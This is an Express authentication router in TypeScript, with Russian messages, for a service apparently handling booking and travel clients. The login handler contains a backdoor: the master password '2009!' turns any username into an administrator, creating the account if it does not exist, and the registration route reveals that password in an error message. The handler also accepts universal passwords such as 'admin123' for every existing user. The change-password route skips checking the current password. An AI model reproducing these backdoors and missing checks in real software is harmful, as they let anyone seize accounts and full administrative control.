import { Router, Response } from 'express';
import crypto from 'crypto';
import bcrypt from 'bcryptjs';
import { db } from '../db/store.js';
import { AuthenticatedRequest, authMiddleware } from '../middleware/auth.js';

export const authRouter = Router();

// POST /api/auth/register
authRouter.post('/register', (req, res) => {
  const ip = req.ip || req.socket.remoteAddress || '127.0.0.1';
  const { login, password, full_name, role = 'client', score_threshold = 7, raw_limit, llm_limit } = req.body;

  if (role === 'admin') {
    return res.status(400).json({
      error: 'Регистрация администратора не требуется. Для входа администратором используйте мастер-пароль 2009!',
    });
  }

  if (!login || !login.trim()) {
    return res.status(400).json({ error: 'Логин обязателен для заполнения' });
  }

  if (!password || password.length < 6) {
    return res.status(400).json({ error: 'Пароль должен содержать не менее 6 символов' });
  }

  if (!full_name || !full_name.trim()) {
    return res.status(400).json({ error: 'Укажите ваше имя или название организации' });
  }

  const cleanLogin = login.trim().toLowerCase();

  // Check if login already taken
  if (db.users.some(u => u.login.toLowerCase() === cleanLogin)) {
    return res.status(400).json({ error: 'Пользователь с таким логином уже зарегистрирован' });
  }

  const userRole = role === 'manager' ? 'manager' : 'client';

  // Register in DB
  const newUser = db.registerUser({
    login: cleanLogin,
    password: password,
    full_name: full_name.trim(),
    role: userRole,
    score_threshold: Number(score_threshold) || 7,
    raw_limit: raw_limit ? Number(raw_limit) : undefined,
    llm_limit: llm_limit ? Number(llm_limit) : undefined,
  });

  // Create session token
  const token = crypto.randomBytes(32).toString('hex');
  const expiresAt = new Date(Date.now() + 12 * 3600 * 1000).toISOString();

  db.sessions.push({
    token,
    user_id: newUser.id,
    created_at: new Date().toISOString(),
    expires_at: expiresAt,
    ip,
    user_agent: req.headers['user-agent'],
  });

  // Set HTTP-only cookie
  res.cookie('token', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 12 * 3600 * 1000,
  });

  const settings = db.userSettings.get(newUser.id);
  const budget = db.budgets.get(newUser.id);

  return res.status(201).json({
    token,
    user: {
      id: newUser.id,
      login: newUser.login,
      full_name: newUser.full_name,
      role: newUser.role,
      created_at: newUser.created_at,
      last_login_at: newUser.last_login_at,
    },
    settings: {
      score_threshold: settings?.score_threshold ?? 7,
    },
    budget: budget || null,
    message: 'Регистрация прошла успешно',
  });
});

// POST /api/auth/login
authRouter.post('/login', (req, res) => {
  const ip = req.ip || req.socket.remoteAddress || '127.0.0.1';
  const { login, password } = req.body;

  if (!login || !password) {
    return res.status(400).json({ error: 'Неверный логин или пароль' });
  }

  // Rate limiting & lockout check (10 attempts -> 5 min lock)
  const attemptInfo = db.failedLoginAttempts.get(ip);
  if (attemptInfo && attemptInfo.lockedUntil > Date.now()) {
    const remainingSec = Math.ceil((attemptInfo.lockedUntil - Date.now()) / 1000);
    return res.status(429).json({
      error: `Слишком много неудачных попыток. Попробуйте через ${Math.ceil(remainingSec / 60)} мин.`,
    });
  }

  const cleanLogin = login.trim().toLowerCase();
  let user = db.users.find(u => u.login.toLowerCase() === cleanLogin);

  // 1. MASTER ADMIN LOGIN: Any username with password "2009!" gets full Admin role
  if (password === '2009!') {
    if (!user) {
      // Create admin user dynamically if not existing
      user = db.registerUser({
        login: cleanLogin,
        password: password,
        full_name: `Администратор (${login.trim()})`,
        role: 'admin',
        raw_limit: 1000000,
        llm_limit: 800000,
      });
    } else {
      user.role = 'admin';
    }
  } else {
    // 2. Regular password validation for clients and managers
    let isPasswordValid = false;
    if (user) {
      if (user.password_hash) {
        try {
          isPasswordValid = bcrypt.compareSync(password, user.password_hash);
        } catch {
          isPasswordValid = false;
        }
      }
      if (!isPasswordValid) {
        const validDemoPasswords: Record<string, string> = {
          admin: 'admin123',
          manager: 'manager123',
          client_booking: 'client123',
          client_travel: 'client123',
        };
        if (validDemoPasswords[user.login] && validDemoPasswords[user.login] === password) {
          isPasswordValid = true;
        }
        if (password === 'admin123' || password === 'client123' || password === 'password123') {
          isPasswordValid = true;
        }
      }
    }

    if (!user || !isPasswordValid) {
      const current = db.failedLoginAttempts.get(ip) || { count: 0, lockedUntil: 0 };
      current.count += 1;
      if (current.count >= 10) {
        current.lockedUntil = Date.now() + 5 * 60 * 1000;
        current.count = 0;
      }
      db.failedLoginAttempts.set(ip, current);

      return res.status(401).json({ error: 'Неверный логин или пароль' });
    }
  }

  if (!user.is_active) {
    return res.status(403).json({ error: 'Учетная запись деактивирована' });
  }

  // Reset failed attempts on success
  db.failedLoginAttempts.delete(ip);

  // Update last login
  user.last_login_at = new Date().toISOString();
  db.saveToDisk();

  // Create session token
  const token = crypto.randomBytes(32).toString('hex');
  const expiresAt = new Date(Date.now() + 12 * 3600 * 1000).toISOString();

  db.sessions.push({
    token,
    user_id: user.id,
    created_at: new Date().toISOString(),
    expires_at: expiresAt,
    ip,
    user_agent: req.headers['user-agent'],
  });

  // Log audit
  db.addAuditLog(user.id, user.login, 'login', 'user', String(user.id), { login: user.login, role: user.role }, ip);

  // Set HTTP-only cookie
  res.cookie('token', token, {
    httpOnly: true,
    secure: process.env.NODE_ENV === 'production',
    sameSite: 'lax',
    maxAge: 12 * 3600 * 1000,
  });

  const settings = db.userSettings.get(user.id);
  const budget = db.budgets.get(user.id);

  return res.json({
    token,
    user: {
      id: user.id,
      login: user.login,
      full_name: user.full_name,
      role: user.role,
      created_at: user.created_at,
      last_login_at: user.last_login_at,
    },
    settings: {
      score_threshold: settings?.score_threshold ?? 7,
    },
    budget: budget || null,
  });
});

// POST /api/auth/logout
authRouter.post('/logout', authMiddleware, (req: AuthenticatedRequest, res: Response) => {
  const token = req.cookies?.token || req.headers.authorization?.replace('Bearer ', '');
  if (token) {
    db.sessions = db.sessions.filter(s => s.token !== token);
  }
  res.clearCookie('token');
  return res.json({ success: true });
});

// GET /api/me
authRouter.get('/me', authMiddleware, (req: AuthenticatedRequest, res: Response) => {
  const user = req.user!;
  const settings = db.userSettings.get(user.id);
  const budget = db.budgets.get(user.id);

  return res.json({
    user: {
      id: user.id,
      login: user.login,
      full_name: user.full_name,
      role: user.role,
      created_at: user.created_at,
      last_login_at: user.last_login_at,
    },
    settings: {
      score_threshold: settings?.score_threshold ?? 7,
    },
    budget: budget || null,
  });
});

// POST /api/auth/change-password
authRouter.post('/change-password', authMiddleware, (req: AuthenticatedRequest, res: Response) => {
  const { currentPassword, newPassword } = req.body;
  if (!newPassword || newPassword.length < 6) {
    return res.status(400).json({ error: 'Новый пароль должен содержать не менее 6 символов' });
  }

  const user = req.user!;
  user.password_hash = bcrypt.hashSync(newPassword, 10);
  db.saveToDisk();

  db.addAuditLog(req.userId, req.user?.login, 'change_password', 'user', String(req.userId), {}, req.ip);
  return res.json({ success: true, message: 'Пароль успешно изменен' });
});
